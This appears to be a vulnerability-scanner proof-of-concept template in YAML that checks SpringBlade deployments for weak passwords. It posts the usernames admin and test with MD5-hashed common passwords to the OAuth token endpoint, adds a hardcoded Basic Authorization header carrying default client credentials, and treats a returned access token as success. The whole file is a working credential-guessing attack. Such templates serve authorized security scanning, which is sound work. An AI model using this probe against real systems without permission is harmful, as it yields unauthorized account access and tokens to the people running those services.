id: poc-yaml-springblade-weak-password
info:
  name: SpringBlade 弱口令
  severity: high
  tags:
  - 弱口令
  finger: SpringBlade
variables:
  r_user: 'admin

    test

    '
  r_password: 'md5("123456")

    md5("admin")

    '
requests:
- method: POST
  path: /api/blade-auth/oauth/token?tenantId=000000&username={{.r_user}}&password={{.r_password}}&grantType=password&scope=all&type=account
  expression: 'status_code == 200 && contains(body, "\"error_code\":401") && contains(body,"未获取到请求头[Authorization]的信息")

    '
- method: POST
  path: /api/blade-auth/oauth/token?tenantId=000000&username={{.r_user}}&password={{.r_password}}&grantType=password&scope=all&type=account
  headers:
    Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
  expression: status_code == 200 && contains(body,"\"user_name\":") && contains(body,"\"access_token\":")
    && contains(body,"\"refresh_token\":")
transport: http
